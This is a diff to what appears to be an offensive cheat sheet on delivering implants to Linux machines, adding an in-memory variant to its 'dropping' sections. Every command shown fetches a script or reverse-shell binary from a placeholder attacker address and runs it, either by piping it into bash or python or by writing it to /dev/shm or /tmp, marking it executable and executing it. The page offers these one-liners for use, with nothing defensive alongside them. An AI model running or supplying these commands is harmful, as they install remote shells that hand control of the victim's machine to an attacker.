@@ -12,12 +12,20 @@ $ wget -qO- http[s]://<IP>/implant.sh | bash
 $ wget -qO- http[s]://<IP>/implant.py | python
 ```
 
-## 02 - Dropping on disk
+## 02 - Dropping on memory
 
 Download reverse shell binary and execute it.
 
 ```
-$ wget -O shell.elf http[s]://<IP>/shell.elf && chmod +x shell.elf && ./shell.elf
+$ wget -O /dev/shm/implant http[s]://<IP>/implant && chmod +x /dev/shm/implant && /dev/shm/implant
+```
+
+## 03 - Dropping on disk
+
+Download reverse shell binary and execute it.
+
+```
+$ wget -O /tmp/implant http[s]://<IP>/implant && chmod +x /tmp/implant && /tmp/implant
 ```
 
 ## 03 - Compiled After Delivery
